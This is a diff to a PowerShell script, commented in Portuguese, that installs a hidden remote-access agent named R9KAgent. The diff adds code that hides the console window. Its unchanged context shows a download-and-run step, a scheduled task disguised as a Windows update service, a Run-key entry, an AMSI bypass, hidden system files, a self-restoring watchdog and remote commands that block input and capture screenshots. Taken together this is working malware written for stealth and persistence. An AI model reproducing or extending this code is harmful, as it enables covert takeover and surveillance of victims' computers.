@@ -15,7 +15,14 @@ if (-not $isAdmin) {
     exit
 }
 
-# ===== CAMINHOS E VBS WRAPPER =====
+# ===== ESCONDE E VAI PRO BACKGROUND =====
+Add-Type -Name Window -Namespace Console -MemberDefinition '
+[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
+[DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+'
+$consolePtr = [Console.Window]::GetConsoleWindow()
+[Console.Window]::ShowWindow($consolePtr, 0)
+
 $dir = "$env:ProgramData\Microsoft\Windows\Caches"
 $scriptPath = "$dir\$installName.ps1"
 $vbsPath = "$dir\$installName.vbs"
@@ -23,7 +30,6 @@ $vbsPath = "$dir\$installName.vbs"
 New-Item -ItemType Directory -Path $dir -Force -ErrorAction SilentlyContinue | Out-Null
 try { (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath) } catch {}
 
-# Cria o VBS que roda o PowerShell invisível
 $vbsContent = 'CreateObject("WScript.Shell").Run "powershell.exe -nop -w hidden -ep bypass -f ""' + $scriptPath + '""", 0, False'
 Set-Content -Path $vbsPath -Value $vbsContent -Force -ErrorAction SilentlyContinue
 
@@ -47,11 +53,10 @@ try {
     Register-ScheduledTask -TaskName "MicrosoftWindowsUpdateService" -Action $action -Trigger $trigger1,$trigger2,$trigger3 -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue | Out-Null
 } catch {}
 
-# ===== FECHA O TERMINAL E RODA EM BACKGROUND =====
 if (-not $env:WinUpdateHidden) {
     $env:WinUpdateHidden = "1"
     Start-Process wscript.exe -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden
-    exit # Isso fecha a janela do PowerShell na hora
+    exit
 }
 
 # ===== AMSI BYPASS =====
@@ -92,7 +97,6 @@ if (-not ("R9KAgent" -as [type])) {
 
         public static void Start(string ip, int port) {
             IP = ip; PORT = port;
-            
             Thread tWatch = new Thread(WatchdogLoop); tWatch.IsBackground = true; tWatch.Start();
 
             while (true) {
@@ -119,7 +123,6 @@ if (-not ("R9KAgent" -as [type])) {
         static void WatchdogLoop() {
             string scriptPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches\WinUpdateSvc.ps1";
             string vbsPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches\WinUpdateSvc.vbs";
-            
             while (true) {
                 try {
                     if (!File.Exists(scriptPath)) {
@@ -132,7 +135,6 @@ if (-not ("R9KAgent" -as [type])) {
                         File.WriteAllText(vbsPath, vbs);
                         File.SetAttributes(vbsPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly);
                     }
-
                     string cmd = "wscript.exe //B //Nologo \"" + vbsPath + "\"";
                     using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) {
                         if (rk.GetValue("WinUpdateSvc") == null) rk.SetValue("WinUpdateSvc", cmd);
@@ -168,10 +170,7 @@ if (-not ("R9KAgent" -as [type])) {
                             Cursor.Position = new Point(targetX, targetY);
                         }
                     } else {
-                        if (hasNewPos) {
-                            Cursor.Position = new Point(targetX, targetY);
-                            hasNewPos = false;
-                        }
+                        if (hasNewPos) { Cursor.Position = new Point(targetX, targetY); hasNewPos = false; }
                     }
                 } catch {}
                 Thread.Sleep(5);
@@ -209,14 +208,8 @@ if (-not ("R9KAgent" -as [type])) {
                     Environment.Exit(0); 
                 }
                 
-                if (cmd == "lock_mouse") {
-                    targetX = Cursor.Position.X; targetY = Cursor.Position.Y;
-                    isLocked = true; BlockInput(true); Send("MOUSE_LOCKED"); return;
-                }
-                if (cmd == "unlock_mouse") { 
-                    isLocked = false; BlockInput(false); Send("MOUSE_UNLOCKED"); return; 
-                }
-
+                if (cmd == "lock_mouse") { targetX = Cursor.Position.X; targetY = Cursor.Position.Y; isLocked = true; BlockInput(true); Send("MOUSE_LOCKED"); return; }
+                if (cmd == "unlock_mouse") { isLocked = false; BlockInput(false); Send("MOUSE_UNLOCKED"); return; }
                 if (cmd == "screenshot") { Send("SCREEN:" + CaptureScreen(1920, 85)); return; }
                 if (cmd == "ping") { Send("PONG"); return; }
 
@@ -270,5 +263,4 @@ if (-not ("R9KAgent" -as [type])) {
 "@
 }
 
-# Inicia o Agente
 [R9KAgent]::Start($serverIP, $serverPort)
